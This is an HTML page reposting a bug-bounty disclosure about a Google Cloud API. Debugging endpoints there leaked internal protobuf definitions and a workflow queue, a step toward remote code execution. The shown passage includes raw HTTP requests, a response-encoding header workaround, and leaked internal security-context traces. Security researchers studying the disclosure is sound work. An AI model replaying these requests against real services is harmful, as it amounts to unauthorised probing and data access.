@@ -1,0 +1,640 @@
+<!DOCTYPE html><html lang="zh-CN" data-astro-cid-sckkx6r4> <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v6.3.6"><!-- Core SEO --><meta name="description" content="A chance Discord message, two missing pieces, and one hour before the window closed: From info leak to RCE on Google Cloud. Three months later, it happened again."><meta name="keywords"><meta name="author" content="Yuyi"><meta name="robots" content="index, follow"><meta name="googlebot" content="index, follow"><!-- Canonical URL --><link rel="canonical" href="https://blog.yuyins.com/reading-list/stubzero-148337-rce-in-google-cloud-production-q0kh3h/"><!-- Content Security Policy --><meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline' fonts.googleapis.com; script-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self'; font-src 'self' data: fonts.gstatic.com;"><!-- Theme & Mobile --><meta name="theme-color" content="#f5f0e8"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="apple-mobile-web-app-title" content="雅俗共赏"><!-- Language & Regional --><meta http-equiv="Content-Language" content="zh-CN"><link rel="alternate" hreflang="zh-CN" href="https://blog.yuyins.com/reading-list/stubzero-148337-rce-in-google-cloud-production-q0kh3h/"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://blog.yuyins.com/reading-list/stubzero-148337-rce-in-google-cloud-production-q0kh3h/"><meta property="og:title" content="StubZero: $148,337 RCE in Google Cloud Production"><meta property="og:description" content="A chance Discord message, two missing pieces, and one hour before the window closed: From info leak to RCE on Google Cloud. Three months later, it happened again."><meta property="og:image" content="https://blog.yuyins.com/og-image.png"><meta property="og:image:alt" content="A chance Discord message, two missing pieces, and one hour before the window closed: From info leak to RCE on Google Cloud. Three months later, it happened again."><meta property="og:locale" content="zh_CN"><meta property="og:site_name" content="雅俗共赏"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://blog.yuyins.com/reading-list/stubzero-148337-rce-in-google-cloud-production-q0kh3h/"><meta property="twitter:title" content="StubZero: $148,337 RCE in Google Cloud Production"><meta property="twitter:description" content="A chance Discord message, two missing pieces, and one hour before the window closed: From info leak to RCE on Google Cloud. Three months later, it happened again."><meta property="twitter:image" content="https://blog.yuyins.com/og-image.png"><title>StubZero: $148,337 RCE in Google Cloud Production</title><!-- JSON-LD Structured Data --><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","name":"雅俗共赏","description":"记录技术、阅读与开源更新的中文博客。","url":"https://blog.yuyins.com/","potentialAction":{"@type":"SearchAction","target":"https://blog.yuyins.com/search?q={search_term_string}","query-input":"required name=search_term_string"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"首页","item":"https://blog.yuyins.com/"},{"@type":"ListItem","position":2,"name":"订阅读物","item":"https://blog.yuyins.com/reading-list"},{"@type":"ListItem","position":3,"name":"StubZero: $148,337 RCE in Google Cloud Production","item":"https://blog.yuyins.com/reading-list/stubzero-148337-rce-in-google-cloud-production-q0kh3h/"}]}]}</script><!-- 初始化配色方案 --><script>
+			document.documentElement.setAttribute('data-color', 'stone-amber');
+		</script><style>.chip[data-astro-cid-b4zvghpy]{display:inline-flex;align-items:center;gap:.45rem;border-radius:9999px;border:1px solid transparent;background:var(--muted);color:var(--foreground);font-weight:500;line-height:1.4;text-decoration:none;white-space:nowrap}.chip--sm[data-astro-cid-b4zvghpy]{padding:.25rem .625rem;font-size:.8125rem}.chip--md[data-astro-cid-b4zvghpy]{padding:.375rem .875rem;font-size:.875rem}.chip--interactive[data-astro-cid-b4zvghpy]{cursor:pointer;transition:background-color .2s ease,color .2s ease,opacity .2s ease}.chip--interactive[data-astro-cid-b4zvghpy]:hover{background-color:color-mix(in srgb,var(--accent) 10%,var(--background-subtle, var(--background)));color:color-mix(in srgb,var(--accent-hover) 68%,var(--foreground))}.chip--active[data-astro-cid-b4zvghpy],.chip[data-astro-cid-b4zvghpy].active{background-color:color-mix(in srgb,var(--accent) 18%,var(--background-subtle, var(--background)));color:color-mix(in srgb,var(--accent-hover) 82%,var(--foreground));border-color:transparent;box-shadow:none;font-weight:600}.chip--dashed[data-astro-cid-b4zvghpy]{border-style:dashed;border-color:color-mix(in srgb,var(--accent) 22%,var(--border));background:color-mix(in srgb,var(--background) 70%,var(--muted))}.chip[data-astro-cid-b4zvghpy]:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+</style>
+<link rel="stylesheet" href="/_astro/Layout.okDzrwE6.css">
+<style>.blog-post-container[data-astro-cid-wrgicudb]{width:100%;margin:0 auto;padding:2rem 0;animation:fadeIn .3s ease-out}.blog-post[data-astro-cid-wrgicudb]{width:100%;min-width:0;max-width:42rem;margin:0 auto}.article-header[data-astro-cid-wrgicudb]{margin-bottom:2rem;padding-bottom:1rem;border-bottom:1px solid var(--border)}.article-header[data-astro-cid-wrgicudb] h1[data-astro-cid-wrgicudb]{font-size:2rem;line-height:1.3;margin-bottom:1rem;font-weight:700;color:var(--foreground);word-break:break-word}.article-meta[data-astro-cid-wrgicudb]{display:flex;align-items:center;gap:.5rem;font-size:.875rem;color:var(--muted-foreground)}.separator[data-astro-cid-wrgicudb]{color:var(--border)}.article-content[data-astro-cid-wrgicudb]{line-height:1.8;margin-bottom:3rem;font-size:1.0625rem;color:var(--foreground)}.article-content[data-astro-cid-wrgicudb] h2{margin-top:2rem;margin-bottom:1rem;font-size:1.5rem;font-weight:600}.article-content[data-astro-cid-wrgicudb] h3{margin-top:1.5rem;margin-bottom:.75rem;font-size:1.25rem;font-weight:600}.article-content[data-astro-cid-wrgicudb] p{margin-bottom:1.25rem}.article-content[data-astro-cid-wrgicudb] a{color:var(--accent);text-decoration:underline;text-underline-offset:2px}.article-content[data-astro-cid-wrgicudb] img{max-width:100%;height:auto;border-radius:.5rem;margin:1.5rem 0}.article-content[data-astro-cid-wrgicudb] blockquote{border-left:4px solid var(--border);padding-left:1rem;margin:1.5rem 0;font-style:italic}.article-content[data-astro-cid-wrgicudb] pre{background:var(--muted);padding:1rem;border-radius:.5rem;overflow-x:auto;font-family:monospace;margin:1.5rem 0}.article-content[data-astro-cid-wrgicudb] ul,.article-content[data-astro-cid-wrgicudb] ol{padding-left:1.5rem;margin-bottom:1.25rem}.article-content[data-astro-cid-wrgicudb] li{margin-bottom:.5rem}.article-footer[data-astro-cid-wrgicudb]{padding-top:2rem;border-top:1px solid var(--border);display:flex;flex-direction:column;gap:1.5rem;align-items:center}.action-row[data-astro-cid-wrgicudb]{display:flex;justify-content:center}.read-original-btn[data-astro-cid-wrgicudb]{display:inline-flex;align-items:center;gap:.5rem;padding:.75rem 1.5rem;background-color:var(--foreground);color:var(--background);border-radius:.5rem;font-weight:500;text-decoration:none;transition:opacity .2s}.read-original-btn[data-astro-cid-wrgicudb]:hover{opacity:.9}.back-to-list[data-astro-cid-wrgicudb]{text-align:center}.back-link[data-astro-cid-wrgicudb]{color:var(--muted-foreground);text-decoration:none;font-size:.8125rem;transition:color .2s}.back-link[data-astro-cid-wrgicudb]:hover{color:var(--accent)}.back-link--top[data-astro-cid-wrgicudb]{display:inline-block;margin-bottom:1rem}
+</style></head> <body data-astro-cid-sckkx6r4> <a id="skip-to-content" href="#main-content" class="sr-only focus:not-sr-only focus:absolute focus:top-4 focus:left-4 focus:z-50 focus:px-4 focus:py-2 focus:bg-accent focus:text-background" data-astro-cid-sckkx6r4>Skip to content</a> <header class="header" data-astro-cid-3ef6ksr2> <nav class="header-nav" aria-label="Main navigation" data-astro-cid-3ef6ksr2> <a href="/" class="header-logo" data-astro-cid-3ef6ksr2> 雅俗共赏 </a> <div class="header-links" data-astro-cid-3ef6ksr2> <ul class="nav-list" data-astro-cid-3ef6ksr2> <li data-astro-cid-3ef6ksr2> <a href="/" class="nav-link" data-astro-prefetch="true" data-astro-cid-3ef6ksr2> 文章 </a> </li><li data-astro-cid-3ef6ksr2> <a href="/category" class="nav-link" data-astro-prefetch="true" data-astro-cid-3ef6ksr2> 分类 </a> </li><li data-astro-cid-3ef6ksr2> <a href="/reading-list" class="nav-link" data-astro-prefetch="true" data-astro-cid-3ef6ksr2> 订阅 </a> </li><li data-astro-cid-3ef6ksr2> <a href="/about" class="nav-link" data-astro-prefetch="true" data-astro-cid-3ef6ksr2> 关于 </a> </li> </ul> <div class="header-actions" data-astro-cid-3ef6ksr2> <div id="search" data-astro-cid-otpdt6jm> <button id="search-button" class="search-toggle" aria-label="打开搜索" title="搜索 (⌘K)" data-astro-cid-otpdt6jm> <svg class="search-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" data-astro-cid-otpdt6jm> <circle cx="11" cy="11" r="7" stroke="currentColor" stroke-width="2" stroke-linecap="round" data-astro-cid-otpdt6jm></circle> <path d="M20 20L16.5 16.5" stroke="currentColor" stroke-width="2" stroke-linecap="round" data-astro-cid-otpdt6jm></path> </svg> </button> <dialog id="search-dialog" class="search-dialog" data-astro-cid-otpdt6jm> <div class="search-dialog-card" data-astro-cid-otpdt6jm> <div class="search-dialog-bar" data-astro-cid-otpdt6jm> <svg class="search-bar-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" data-astro-cid-otpdt6jm> <circle cx="11" cy="11" r="8" data-astro-cid-otpdt6jm></circle><path d="m21 21-4.3-4.3" data-astro-cid-otpdt6jm></path> </svg> <div id="pagefind-ui" class="search-pagefind-slot" data-astro-cid-otpdt6jm></div> <kbd class="search-kbd" data-astro-cid-otpdt6jm>ESC</kbd> <button id="close-search" class="search-dialog-close" type="button" aria-label="关闭搜索" data-astro-cid-otpdt6jm> <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" aria-hidden="true" data-astro-cid-otpdt6jm> <path d="M18 6 6 18" data-astro-cid-otpdt6jm></path><path d="m6 6 12 12" data-astro-cid-otpdt6jm></path> </svg> </button> </div> </div> </dialog> </div> <script type="module">let d=!1;const c="pagefind-loaded";async function l(e=0){if(sessionStorage.getItem(c)==="true")return m(),!0;const s=document.getElementById("pagefind-ui");if(!s)return!1;s.innerHTML='<div class="search-loading">加载中...</div>';try{return await new Promise((r,o)=>{const a=document.createElement("script");a.src="/pagefind/pagefind-ui.js",a.onload=r,a.onerror=o,document.head.appendChild(a)}),m(),sessionStorage.setItem(c,"true"),!0}catch(i){return console.error("Failed to load search:",i),e<2?(console.log(`Retrying search load... (${e+1}/2)`),await new Promise(r=>setTimeout(r,1e3)),l(e+1)):(s&&(s.innerHTML=`
+          <div class="search-loading">
+            <p>搜索功能加载失败</p>
+            <button id="retry-search" class="search-retry-btn">重试</button>
+          </div>
+        `,document.getElementById("retry-search")?.addEventListener("click",()=>{sessionStorage.removeItem(c),l(0)})),!1)}}function m(){typeof PagefindUI<"u"&&(new PagefindUI({element:"#pagefind-ui",showSubResults:!0,showImages:!1,excerptLength:15,translations:{placeholder:"搜索文章...",clear_search:"清除",load_more:"加载更多",search_label:"搜索此站点",filters_label:"筛选",zero_results:"未找到结果 [SEARCH_TERM]",many_results:"找到 [COUNT] 个结果 [SEARCH_TERM]",one_result:"找到 [COUNT] 个结果 [SEARCH_TERM]",alt_search:"未找到 [SEARCH_TERM] 的结果。显示 [DIFFERENT_TERM] 的结果",search_suggestion:"未找到 [SEARCH_TERM] 的结果。尝试以下搜索：",searching:"搜索中 [SEARCH_TERM]..."}}),setTimeout(()=>{const e=document.querySelector(".pagefind-ui__search-input");e instanceof HTMLElement&&e.focus()},100))}function u(){if(d)return;d=!0;const e=document.getElementById("search-button"),n=document.getElementById("search-dialog"),s=document.getElementById("close-search");if(!e||!n||!s)return;let i=sessionStorage.getItem(c)==="true";const r=async()=>{n.showModal(),i?setTimeout(()=>{const t=document.querySelector(".pagefind-ui__search-input");t instanceof HTMLElement&&t.focus()},100):await l()&&(i=!0)},o=()=>{n.close()},a=t=>{t.target===n&&o()},f=t=>{(t.metaKey||t.ctrlKey)&&t.key==="k"&&(t.preventDefault(),n.open?o():r())};e.addEventListener("click",r),s.addEventListener("click",o),n.addEventListener("click",a),document.addEventListener("keydown",f),document.addEventListener("astro:before-swap",()=>{e.removeEventListener("click",r),s.removeEventListener("click",o),n.removeEventListener("click",a),document.removeEventListener("keydown",f),d=!1},{once:!0})}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",u):u();document.addEventListener("astro:page-load",u);</script> <link href="/pagefind/pagefind-ui.css" rel="stylesheet"> </div> </div> </nav> </header> <main id="main-content" data-pagefind-body class="main-content main-content--wide" data-astro-cid-sckkx6r4>  <div class="blog-post-container" data-astro-cid-wrgicudb> <article class="blog-post" data-astro-cid-wrgicudb> <a href="/reading-list" class="back-link back-link--top" data-astro-prefetch data-astro-cid-wrgicudb>← 返回订阅列表</a> <header class="article-header" data-astro-cid-wrgicudb> <h1 data-astro-cid-wrgicudb>StubZero: $148,337 RCE in Google Cloud Production</h1> <div class="article-meta" data-astro-cid-wrgicudb> <a href="https://brutecat.com" target="_blank" rel="noopener noreferrer" data-astro-cid-wrgicudb="true" data-astro-cid-b4zvghpy="true" class="chip chip--sm chip--interactive source-tag"> brutecat.com </a> <span class="separator" data-astro-cid-wrgicudb>·</span> <time data-astro-cid-wrgicudb>2026年6月1日</time> </div> </header> <!-- 使用清洗后的安全 HTML 内容 --> <div class="article-content app-prose" data-astro-cid-wrgicudb><p>What started as a debugging endpoint info leak escalated into full remote code execution on Google Cloud's production environment. Three months later, it happened again. This vulnerability was assigned <strong><a href="https://www.cve.org/CVERecord?id=CVE-2026-2031" target="_blank" rel="noopener noreferrer">CVE-2026-2031</a></strong>.</p>
+<p>This story starts with one of my automated fuzzing tools alerting me about the API <strong>cloudcrmipfrontend-pa.googleapis.com</strong>, as it was responding with status 200 to some suspicious endpoints. On further inspection, the API seems to have several public debugging endpoints:</p>
+<p><img src="/assets/google-cloud-rce/get_people_debug_endpoint.png" alt="" /></p>
+<p><em>Screenshot from an internal API explorer tool I built for testing internal Google APIs from a <a href="/articles/decoding-google" target="_blank" rel="noopener noreferrer">discovery document</a></em></p>
+<h3><a href="#req2proto-as-a-service" target="_blank" rel="noopener noreferrer">#</a>req2proto as a Service™</h3><p>Some of the endpoints like <code>GET /v1/integrationPlatform:listServicesByServer</code> seemed to always return internal server error. However, the endpoint <code>/v1/integrationPlatform:getProtoDefinition</code> seemed to return the proto definitions of <strong>any protobuf message in google3</strong> (google's internal source code monorepo), even for unrelated services like YouTube.</p>
+<p><strong>Request</strong></p>
+<pre><code><span>GET</span> <span>/v1/integrationPlatform:getProtoDefinition?fullName=youtube.api.pfiinnertube.YoutubeApiInnertube.InnerTubeContext&amp;isEnum=false</span> <span>HTTP/2</span>
+<span>Host</span><span>: </span>cloudcrmipfrontend-pa.clients6.google.com
+<span>Cookie</span><span>: </span>&lt;redacted&gt;
+<span>Authorization</span><span>: </span>SAPISIDHASH &lt;redacted&gt;
+<span>Origin</span><span>: </span>https://console.cloud.google.com
+<span>X-Goog-Api-Key</span><span>: </span>AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE</code></pre><blockquote>
+<p>For authentication with this API, we are using Google's proprietary first-party authentication. This involves your Google account cookie header along with an <a href="https://gist.github.com/eyecatchup/2d700122e24154fdc985b7071ec7764a" target="_blank" rel="noopener noreferrer">Authorization header value calculated</a> using the <code>SAPISID</code> cookie as well as the whitelisted origin <strong><a href="https://console.cloud.google.com" target="_blank" rel="noopener noreferrer">https://console.cloud.google.com</a></strong></p>
+</blockquote>
+<p><strong>Response</strong></p>
+<pre><code><span>{</span>
+  <span>"protoDescriptor"</span><span>:</span> <span>{</span>
+    <span>"name"</span><span>:</span> <span>"InnerTubeContext"</span><span>,</span>
+    <span>"field"</span><span>:</span> <span>[</span>
+      <span>{</span>
+        <span>"name"</span><span>:</span> <span>"client"</span><span>,</span>
+        <span>"number"</span><span>:</span> <span>1</span><span>,</span>
+        <span>"label"</span><span>:</span> <span>"LABEL_OPTIONAL"</span><span>,</span>
+        <span>"type"</span><span>:</span> <span>"TYPE_MESSAGE"</span><span>,</span>
+        <span>"typeName"</span><span>:</span> <span>".youtube.api.pfiinnertube.YoutubeApiInnertube.ClientInfo"</span><span>,</span>
+        <span>"jsonName"</span><span>:</span> <span>"client"</span>
+      <span>}</span><span>,</span>
+      <span>{</span>
+        <span>"name"</span><span>:</span> <span>"user"</span><span>,</span>
+        <span>"number"</span><span>:</span> <span>3</span><span>,</span>
+        <span>"label"</span><span>:</span> <span>"LABEL_OPTIONAL"</span><span>,</span>
+        <span>"type"</span><span>:</span> <span>"TYPE_MESSAGE"</span><span>,</span>
+        <span>"typeName"</span><span>:</span> <span>".youtube.api.pfiinnertube.YoutubeApiInnertube.UserInfo"</span><span>,</span>
+        <span>"jsonName"</span><span>:</span> <span>"user"</span>
+      <span>}</span><span>,</span>
+...</code></pre><p>This was massive, because in Google, everything is proto. All APIs are defined internally as gRPC services using protobuf, and this would essentially allow for disclosing the request/response body of any endpoint, which for a blackbox target like Google is a gold mine.</p>
+<p>In the past, I had developed a tool <a href="https://github.com/ddd/req2proto" target="_blank" rel="noopener noreferrer">req2proto</a> for this purpose, however that tool was limited only to finding the request body proto, not the response body, and it was also with the assumption that the API supported JSPB (application/json+protobuf) which most APIs didn't. As a joke, my friends and I started referring to this endpoint from then onwards as "req2proto as a service", since it was quite literally a hosted, much more powerful version of the tool.</p>
+<p>Before probing further with this endpoint, I checked if there were any other endpoints leaking information.</p>
+<h3><a href="#leaking-internal-workflow-execution-queue" target="_blank" rel="noopener noreferrer">#</a>Leaking internal workflow execution queue</h3><p><img src="/assets/google-cloud-rce/list_quota_queue_endpoint.jpg" alt="" /></p>
+<p>Initially, without any query parameters set, this endpoint was just returning <strong>INVALID_ARGUMENT</strong> errors. Trying filters like <code>*</code> also didn't work. However, from past experience, these filter parameters usually allow any filtering in accordance with <a href="https://google.aip.dev/160" target="_blank" rel="noopener noreferrer">https://google.aip.dev/160</a></p>
+<p>As such, upon trying <code>client_id&gt;"123"</code> as the filter, I got an interesting response:</p>
+<pre><code><span>{</span>
+  <span>"error"</span><span>:</span> <span>{</span>
+    <span>"code"</span><span>:</span> <span>500</span><span>,</span>
+    <span>"message"</span><span>:</span> <span>"Failed to convert server response to JSON"</span><span>,</span>
+    <span>"status"</span><span>:</span> <span>"INTERNAL"</span>
+  <span>}</span>
+<span>}</span></code></pre><p>It looks like whatever response it was trying to give to me didn't have a JSON mapping. However, Google APIs support changing the response content-type via the standard <code>?alt=</code> parameter. For instance, <code>?alt=proto</code> would return the output in protobuf.</p>
+<p>The only issue is that since we are using Google's proprietary first-party auth for authentication (Cookie and Authorization header), we have to send requests to the hostname <strong>cloudcrmipfrontend-pa.clients6.google.com</strong> instead of <code>cloudcrmipfrontend-pa.googleapis.com</code>, but Google does not allow raw proto responses to requests sent to *.google.com:</p>
+<pre><code>Request unsafe for browser client domain: cloudcrmipfrontend-pa.clients6.google.com</code></pre><p>Thankfully, there's a way around this. We can use the header <code>X-Goog-Encode-Response-If-Executable: base64</code> and this would get the response back in base64 instead of binary data:</p>
+<pre><code><span>GET</span> <span>/v1/integrationPlatform:listQuotaQueue?filter=client_id%3E%22123%22&amp;alt=proto</span> <span>HTTP/2</span>
+<span>Host</span><span>: </span>cloudcrmipfrontend-pa.clients6.google.com
+<span>Cookie</span><span>: </span>&lt;redacted&gt;
+<span>Authorization</span><span>: </span>SAPISIDHASH &lt;redacted&gt;
+<span>Origin</span><span>: </span>https://console.cloud.google.com
+<span>X-Goog-Api-Key</span><span>: </span>AIzaSyBmtG6W8gM5Y6UxzUizxtaERwjmQZ0CCYE
+<span>X-Goog-Encode-Response-If-Executable</span><span>: </span>base64</code></pre><p>The API returned a large base64 protobuf response. Using the proto definition leak from earlier to retrieve the schema for <code>ListQuotaQueueResponse</code>, I was able to decode it properly which revealed that this was some sort of internal workflow execution queue, which included workflows syncing data from <a href="https://cloud.google.com/spanner" target="_blank" rel="noopener noreferrer">Spanner</a> to Salesforce:</p>
+<pre><code><span>{</span>
+  <span>"queue_items"</span><span>:</span> <span>[</span>
+    <span>{</span>
+      <span>"queued_request"</span><span>:</span> <span>{</span>
+        <span>"queued_request_id"</span><span>:</span> <span>"75a885e2-c611-43f7-b4e2-ae0d87bae789"</span><span>,</span>
+        <span>"client_id"</span><span>:</span> <span>"default"</span><span>,</span>
+        <span>"workflow_name"</span><span>:</span> <span>"WriteToSfdc"</span><span>,</span>
+        <span>"priority"</span><span>:</span> <span>"CRITICAL"</span><span>,</span>
+        <span>"received_timestamp"</span><span>:</span> <span>1763057385562</span><span>,</span>
+        <span>"event_execution_info_id"</span><span>:</span> <span>"615cd9a9-9c0e-46ec-90df-91ee42ec9c37"</span>
+      <span>}</span><span>,</span>
+      <span>"event_execution_info"</span><span>:</span> <span>{</span>
+        <span>"client_id"</span><span>:</span> <span>"default"</span><span>,</span>
+        <span>"workflow_name"</span><span>:</span> <span>"WriteToSfdc"</span><span>,</span>
+        <span>"trigger_id"</span><span>:</span> <span>"api_trigger/WriteToSfdc"</span><span>,</span>
+        ...
+        <span>"type_url"</span><span>:</span> <span>"type.googleapis.com/enterprise.crm.datalayer.WriteToSfdcRequest"</span><span>,</span>
+        ...
+        <span>"sfdc_object"</span><span>:</span> <span>{</span>
+          <span>"vector_account"</span><span>:</span> <span>{</span>
+            <span>"id"</span><span>:</span> <span>"001Kf00000wjeK3IAI"</span><span>,</span>
+            <span>"due_diligence__c"</span><span>:</span> <span>"Pending"</span><span>,</span>
+            <span>"due_diligence_sub_status__c"</span><span>:</span> <span>"1. PENDING DD - Initial Submission Review"</span>
+            ...</code></pre><p>Shortly after this, I filed a report for these vulnerabilities. Just a few hours later, it was marked as P0/S0 and got a 🎉 <strong>Nice catch!</strong></p>
+<h3><a href="#escalating-further" target="_blank" rel="noopener noreferrer">#</a>Escalating further?</h3><p>After all this, I was convinced there was likely more to be found in this API, so I started looking at all the workflow endpoints. The API seemed to be related to Google Cloud's <a href="https://cloud.google.com/application-integration" target="_blank" rel="noopener noreferrer">Application Integration</a>.</p>
+<p>It allows you to define a "workflow", that you could supply with a <code>triggerConfig</code> for what should trigger the workflow, as well as <code>taskConfig</code> for what task should be triggered. The most interesting part was that looking at the discovery document, there seemed to be hints of a task called <code>GenericStubbyTypedTask</code> that you seemingly could configure the workflow to execute, which instantly set off red flags. </p>
+<pre><code><span>"EnterpriseCrmEventbusProtoTaskUiModuleConfig"</span><span>:</span> <span>{</span>
+  <span>"description"</span><span>:</span> <span>"Task author would use this type to configure a config module."</span><span>,</span>
+  <span>"id"</span><span>:</span> <span>"EnterpriseCrmEventbusProtoTaskUiModuleConfig"</span><span>,</span>
+  <span>"properties"</span><span>:</span> <span>{</span>
+    <span>"moduleId"</span><span>:</span> <span>{</span>
+      <span>"description"</span><span>:</span> <span>"ID of the config module."</span><span>,</span>
+      <span>"enum"</span><span>:</span> <span>[</span>
+        ...
+        <span>"RPC_TYPED"</span><span>,</span>
+        ...
+      <span>]</span><span>,</span>
+      <span>"enumDescriptions"</span><span>:</span> <span>[</span>
+        ...
+        <span>"Configures a GenericStubbyTypedTask."</span><span>,</span>
+        ...
+      <span>]</span><span>,</span>
+    <span>}</span>
+  <span>}</span>
+<span>}</span><span>,</span></code></pre><p>From <a href="https://sre.google/sre-book/production-environment/" target="_blank" rel="noopener noreferrer">Google's SRE book</a>:</p>
+<blockquote>
+<p>All of Google’s services communicate using a Remote Procedure Call (RPC) infrastructure named Stubby; an open source version, gRPC, is available. Often, an RPC call is made even when a call to a subroutine in the local program needs to be performed. This makes it easier to refactor the call into a different server if more modularity is needed, or when a server’s codebase grows.</p>
+</blockquote>
+<p>From my understanding on how this works, Borg (aka Google Production) follows a <a href="https://cloud.google.com/docs/security/beyondprod" target="_blank" rel="noopener noreferrer">security model</a> where every borgtask service has its own identity. When you send a request to a <code>*.googleapis.com</code> endpoint, the frontend service makes Stubby calls to backend services using its own prod service identity, while carrying your end-user context in a security ticket. If the ticket contains your Gaia user ID, backend services authorize the request as that user. Here are two examples of leaked security tickets from Google API error responses:</p>
+Without authentication (anonymous)<pre><code>com.google.apps.framework.auth.IamPermissionDeniedException:
+  IAM authority does not have the permission 'cloudprivatecatalog.targets.get'
+  required for action PrivateCatalogV1Beta1-SearchProducts
+  on resource ''.<p>Explanation:</p>
+<p>Security Context:<br />  ValidatedSecurityContextWithSystemAuthorizationPolicy<br />    delegate = ValidatedSecurityContextWithRegistryHandle<br />      delegate = ValidatedSecurityContextWithObligations<br />        delegate = ValidatedIamSecurityContext<br />          user  = anonymous<br />          creds = EndUserCreds<br />            loggable_credential {<br />              type: SERVICE_CONTROL_TOKEN<br />            }<br />            access_assertion: ANONYMOUS<br />          peer =<br />            protocol                = loas<br />            psp_version             = 0<br />            level                   = strong_privacy_and_integrity<br />            host                    = jxcbu6.prod.google.com<br />            is_authenticated_host   = false<br />            role                    = cloud-commerce-catalog<br />            user                    = cloud-boq-clientapi-catalog<br />            is_delegated            = true<br />            jobname_chosen_by_user  = prod.cloud-commerce-catalog<br />          InternalIAMIdentity<br />            log = originator {<br />              scope: MDB_USER<br />              mdb_user {<br />                user_name: "cloud-boq-clientapi-catalog"<br />              }<br />            }</p></code></pre><p></p>
+With first-party authentication (Gaia user)<pre><code>com.google.apps.framework.auth.IamPermissionDeniedException:
+  IAM authority does not have the permission 'resourcemanager.projects.get'
+  required for action GetServiceAccessStatus
+  on resource 'projects/613988253758'.<p>Explanation:</p>
+<p>Security Context:<br />  ValidatedSecurityContextWithCloudPolicyChecks<br />    delegate = ValidatedSecurityContextWithCpeContext<br />      delegate = ValidatedSecurityContextWithObligations<br />        delegate = ValidatedSecurityContextWithRegistryHandle<br />          delegate = ContextWithGaiaMintToken<br />            delegate = ValidatedIamSecurityContext<br />              user  = gaiauser/0xaa22527678<br />              creds = EndUserCreds<br />                loggable_credential {<br />                  type: GAIA_MINT<br />                  loggable_gaia_mint { }<br />                }<br />                loggable_credential {<br />                  type: SERVICE_CONTROL_TOKEN<br />                }<br />              peer =<br />                protocol                = loas<br />                psp_version             = 0<br />                level                   = strong_privacy_and_integrity<br />                host                    = pjf8.prod.google.com<br />                is_authenticated_host   = false<br />                role                    = commerceorggovernance-clh<br />                gaiaId                  = 640201889743<br />                security_realm          = campus-dls<br />                is_delegated            = false<br />                borgcell                = pj<br />                task_id                 = 2<br />                user_type               = MDB_USER_NON_PERSON<br />                jobname_chosen_by_user  = prod.commerceorggovernance-clh<br />              InternalIAMIdentity<br />                log = originator {<br />                  scope: GAIA_USER<br />                  gaia_user {<br />                    user_id: 730720269944<br />                  }<br />                }</p></code></pre><p></p>
+<p>In both cases, the <code>peer</code> block shows the prod service identity making the internal Stubby call. The difference is in the end-user context: the first ticket is <code>ANONYMOUS</code>, while the second carries a <code>GAIA_MINT</code> credential (when you use cookie or bearer authentication in Google, it's converted to a standard UberMint token which contains an embedded GaiaMint) meaning the backend authorizes the request as that Gaia user. This is so that a call to lets say <code>/ContactsService.ListContacts</code> only returns contacts for that authorized user.</p>
+<p>If we can perform arbitrary Stubby queries as the integration platform's prod service identity, this would allow us to access a wide variety of RPCs ranging from sensitive user data to code execution depending on the privileges of the prod user. Hence, Google considers this as a massive increase in attack surface and hence <a href="https://www.ezequiel.tech/p/36k-google-app-engine-rce.html" target="_blank" rel="noopener noreferrer">considers this an RCE</a>.</p>
+<p>Often times, even if you can get code execution in a borglet, unless you're particularly interested in what data is processed locally, the main impact is actually access to all of production via Stubby RPCs.</p>
+<p>But what actually gates <em>which</em> RPCs you can call from a stolen Stubby primitive? Every Stubby service in Google has a defined <code>RpcSecurityPolicy</code> with a per-method allowlist. Here's a real one example from the Cloud SQL Speckle Boss process:</p>
+<pre><code><span>mapping</span> {
+  <span>rpc_method:</span> <span>"/SaasActuation.UpdateInstance"</span>
+  <span>rpc_method:</span> <span>"/MaintenancePolicyService.CreateMaintenancePolicy"</span>
+  <span>...</span>
+  <span>authentication_policy</span> {
+    <span>creds_policy</span> {
+      <span>rules</span> {
+        <span>permissions:</span> <span>"auth.creds.useProdUserEUC"</span>
+        <span>action:</span> <span>ALLOW</span>
+        <span>in:</span> <span>"mdb:zamm-exe-3-cloud-sql--default-policy"</span>
+        <span>in:</span> <span>"user:speckle-tool-proxy@prod.google.com"</span>
+      }
+      <span>rules</span> {
+        <span>permissions:</span> <span>"auth.creds.useLOAS"</span>
+        <span>action:</span> <span>ALLOW</span>
+        <span>in:</span> <span>"allUsers"</span>
+      }
+    }
+  }
+  <span>authorization_mode:</span> <span>MANUAL_IAM</span>
+  <span>permission_to_check:</span> <span>"cloudsql.instances.rollout"</span>
+}</code></pre><p>Each <code>mapping</code> block lists a set of RPC methods and declares which callers are allowed to invoke them under which credential type. Based on my understanding, <code>auth.creds.useLOAS</code> means "any borgtask can call this with its own LOAS identity" while <code>auth.creds.useProdUserEUC</code> means "only these specific MDB groups are allowed to forward a Gaia end-user identity (i.e. an UberMint token) into the call".</p>
+<blockquote>
+<p>LOAS (Low Overhead Authentication System) is Google's internal authentication &amp; encryption framework, see <a href="https://www.usenix.org/system/files/login/articles/login_winter16_05_cittadini.pdf" target="_blank" rel="noopener noreferrer">this paper</a> for more information</p>
+</blockquote>
+<p>The <code>permission_to_check</code> then tells the backend which IAM permission to enforce on whatever identity ends up resolved.</p>
